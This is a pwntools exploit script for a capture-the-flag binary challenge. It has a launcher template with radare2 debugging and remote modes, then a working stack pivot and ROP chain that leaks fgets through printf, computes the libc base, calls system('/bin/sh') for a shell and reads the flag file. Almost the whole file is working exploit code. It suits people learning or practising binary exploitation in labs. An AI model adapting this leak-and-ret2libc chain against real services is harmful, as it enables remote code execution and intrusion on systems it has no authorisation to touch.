#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db 0x0040125a; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()
bof = 96
io.recvuntil(b': ')

buffer = int(io.recvline().strip(), 16)
new_rbp = buffer + 8              # padding to allign the stack
success(f"buffer @ {hex(buffer)}")
rop = ROP(exe)

bypassed_main = exe.sym['vuln']+8 # padded main to load the fake rsp

# rop in the stack that will be used 
leak_printf = flat([
    0, 0,                       # lil of padding for stack shift
    rop.rdi[0], exe.got.fgets,  
    exe.plt.printf,
    rop.rbp[0], new_rbp,        # reset the rbp to be sure
    bypassed_main
    ])


pivot_stack = flat([
    leak_printf.ljust(bof, b'a'),   # buffer content
    new_rbp,                        # rbp set by leave 
    bypassed_main,                  # reload the main
    ])


io.sendline(pivot_stack)
io.recvline()
io.sendline()           # empty line to cause the ROP 

leak = u64(io.recvline()[:6].ljust(8, b'\x00'))
libc.address = leak - libc.sym.fgets
binsh = next(libc.search(b"/bin/sh\x00"))
success(f"fgets @ {hex(leak)}")
success(f"libc  @ {hex(libc.address)}")

call_shell = flat([
    rop.rdi[0], binsh,
    rop.ret[0],
    libc.sym.system
    ])

# at this point the program is alligned to the buffer
# so i can send the rop without any pivoting
io.sendline(call_shell)
io.sendline(b"cat flag.txt")
data = io.recvregex(rb'v1t\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()
